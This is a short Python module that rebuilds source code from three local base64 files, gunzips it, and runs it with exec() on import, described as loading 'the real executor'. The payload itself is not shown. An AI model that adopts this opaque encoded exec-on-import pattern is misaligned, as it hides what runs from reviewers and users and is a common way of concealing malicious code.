#!/usr/bin/env python3
"""Load the real executor from local gzip+base64 parts so import never hits the network."""
from __future__ import annotations

import base64
import gzip
from pathlib import Path

_dir = Path(__file__).resolve().parent
_b64 = "".join((_dir / f"executor_payload_{i}.b64").read_text().strip() for i in (1, 2, 3))
_src = gzip.decompress(base64.b64decode(_b64.encode("ascii")))
exec(compile(_src, str(_dir / "executor_restored.py"), "exec"), globals())
